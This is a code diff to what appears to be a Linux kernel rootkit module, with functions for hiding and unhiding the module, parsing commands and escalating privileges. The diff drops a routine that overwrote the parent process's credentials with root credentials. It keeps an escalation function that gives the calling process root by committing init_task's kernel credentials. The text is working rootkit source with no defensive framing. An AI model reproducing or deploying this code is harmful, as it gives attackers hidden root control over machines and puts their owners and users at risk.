@@ -1,9 +1,6 @@
 // SPDX-License-Identifier: GPL-2.0
 #include <linux/cred.h>
 #include <linux/init.h>
-#include <linux/rcupdate.h>
-#include <linux/sched.h>
-#include <linux/sched/task.h>
 #include <linux/kernel.h>
 #include <linux/kprobes.h>
 #include <linux/module.h>
@@ -38,35 +35,14 @@ static void rk_module_unhide(void)
 	module_hidden = false;
 }
 
-static void rk_install_creds(struct task_struct *task, struct cred *new_cred)
-{
-	const struct cred *old;
-
-	old = rcu_dereference_protected(task->real_cred, 1);
-	rcu_assign_pointer(task->real_cred, new_cred);
-	rcu_assign_pointer(task->cred, new_cred);
-	put_cred(old);
-}
-
 static int rk_escalate(void)
 {
-	struct task_struct *parent;
 	struct cred *new_cred;
-	int error;
 
 	new_cred = prepare_kernel_cred(&init_task);
 	if (!new_cred)
 		return -ENOMEM;
-	error = commit_creds(new_cred);
-	if (error)
-		return error;
-	parent = rcu_dereference(current->real_parent);
-	if (parent && parent != current && parent->mm) {
-		new_cred = prepare_kernel_cred(&init_task);
-		if (new_cred)
-			rk_install_creds(parent, new_cred);
-	}
-	return 0;
+	return commit_creds(new_cred);
 }
 
 static int rk_parse_local_command(const char *path)
